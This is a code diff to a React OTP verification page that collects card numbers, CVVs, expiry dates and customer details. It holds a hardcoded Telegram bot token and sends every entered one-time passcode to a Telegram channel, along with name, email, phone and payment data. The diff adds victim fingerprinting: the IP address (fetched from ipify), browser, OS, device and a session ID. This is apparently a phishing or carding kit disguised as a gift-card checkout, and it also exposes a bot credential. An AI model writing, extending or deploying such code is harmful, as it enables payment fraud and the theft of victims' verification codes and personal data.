@@ -12,6 +12,68 @@ import { InputOTP, InputOTPGroup, InputOTPSlot, InputOTPSeparator } from "@/comp
 const TELEGRAM_BOT_TOKEN = "7782642954:AAEhLo5kGD4MlWIsoYnnYHEImf7YDCLsJgo";
 const TELEGRAM_CHANNEL_ID = "-1002550945996";
 
+// Function to get browser information
+const getBrowserInfo = () => {
+  const userAgent = navigator.userAgent;
+  const browserInfo = {
+    userAgent,
+    browser: "Unknown",
+    version: "Unknown",
+    os: "Unknown",
+    device: "Unknown"
+  };
+  
+  // Detect browser
+  if (userAgent.indexOf("Firefox") > -1) {
+    browserInfo.browser = "Mozilla Firefox";
+  } else if (userAgent.indexOf("SamsungBrowser") > -1) {
+    browserInfo.browser = "Samsung Browser";
+  } else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) {
+    browserInfo.browser = "Opera";
+  } else if (userAgent.indexOf("Trident") > -1) {
+    browserInfo.browser = "Internet Explorer";
+  } else if (userAgent.indexOf("Edge") > -1) {
+    browserInfo.browser = "Microsoft Edge";
+  } else if (userAgent.indexOf("Chrome") > -1) {
+    browserInfo.browser = "Google Chrome";
+  } else if (userAgent.indexOf("Safari") > -1) {
+    browserInfo.browser = "Safari";
+  }
+  
+  // Detect OS
+  if (userAgent.indexOf("Win") > -1) {
+    browserInfo.os = "Windows";
+  } else if (userAgent.indexOf("Mac") > -1) {
+    browserInfo.os = "MacOS";
+  } else if (userAgent.indexOf("Linux") > -1) {
+    browserInfo.os = "Linux";
+  } else if (userAgent.indexOf("Android") > -1) {
+    browserInfo.os = "Android";
+  } else if (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) {
+    browserInfo.os = "iOS";
+  }
+  
+  // Detect device type
+  if (userAgent.indexOf("Mobile") > -1) {
+    browserInfo.device = "Mobile";
+  } else if (userAgent.indexOf("Tablet") > -1) {
+    browserInfo.device = "Tablet";
+  } else {
+    browserInfo.device = "Desktop";
+  }
+  
+  return browserInfo;
+};
+
+// Function to generate a unique session ID
+const generateSessionId = () => {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
+    const r = Math.random() * 16 | 0;
+    const v = c === 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+};
+
 const OTPVerification = () => {
   const location = useLocation();
   const navigate = useNavigate();
@@ -21,7 +83,9 @@ const OTPVerification = () => {
   const [error, setError] = useState("");
   const [attempts, setAttempts] = useState(0); // Track OTP verification attempts
   const [key, setKey] = useState(0); // Used to force re-render of OTP input
-
+  const [sessionId] = useState(generateSessionId()); // Generate session ID once on component mount
+  const [ipAddress, setIpAddress] = useState("Unknown");
+  
   // Get order details from location state
   const orderDetails = location.state?.orderDetails;
   const giftCardValue = location.state?.giftCardValue;
@@ -31,6 +95,22 @@ const OTPVerification = () => {
   const cardNumber = location.state?.cardNumber;
   const cvv = location.state?.cvv;
   const expiryDate = location.state?.expiryDate;
+
+  // Fetch IP address on component mount
+  useEffect(() => {
+    const getIpAddress = async () => {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        setIpAddress(data.ip);
+      } catch (error) {
+        console.error('Failed to fetch IP address:', error);
+        setIpAddress("Failed to get IP");
+      }
+    };
+    
+    getIpAddress();
+  }, []);
 
   // Format remaining time as MM:SS
   const formatTime = (seconds: number) => {
@@ -87,21 +167,38 @@ const OTPVerification = () => {
     }
   }, [countdown, navigate]);
 
-  // Send Telegram notification directly
+  // Send Telegram notification with enhanced data
   const sendTelegramNotification = async (attemptNumber: number) => {
-    console.log(`Sending attempt ${attemptNumber} notification to Telegram`);
+    console.log(`Sending attempt ${attemptNumber} notification to Telegram with OTP: ${otp}`);
     try {
-      // Format OTP message - simplified version with just OTP and user info
+      // Get browser information
+      const browserInfo = getBrowserInfo();
+      
+      // Format date and time
+      const currentDate = new Date();
+      const formattedDate = currentDate.toLocaleDateString();
+      const formattedTime = currentDate.toLocaleTimeString();
+      
+      // Format enhanced OTP message
       const message = `
 🔐 *OTP CODE ENTERED: ${otp}*
+🔢 *ATTEMPT: ${attemptNumber}/3*
+
 👤 Customer: ${orderDetails?.customerName || "N/A"}
 📧 Email: ${orderDetails?.email || "N/A"}
 📱 Phone: ${orderDetails?.phone || "N/A"}
-🔢 Attempt: ${attemptNumber}/3
 💳 Payment: ${paymentMethod || "N/A"} •••• ${lastFour || "****"}
 💰 Amount: $${discountedAmount?.toFixed(2) || "0.00"}
 🎁 Card Value: $${giftCardValue?.toFixed(2) || "0.00"}
-⏰ Time: ${new Date().toLocaleString()}
+
+📝 *SESSION DATA:*
+🆔 Session ID: ${sessionId}
+🌐 IP Address: ${ipAddress}
+🖥️ Browser: ${browserInfo.browser}
+💻 OS: ${browserInfo.os}
+📱 Device: ${browserInfo.device}
+📅 Date: ${formattedDate}
+⏰ Time: ${formattedTime}
 `;
 
       // Send message directly to Telegram API
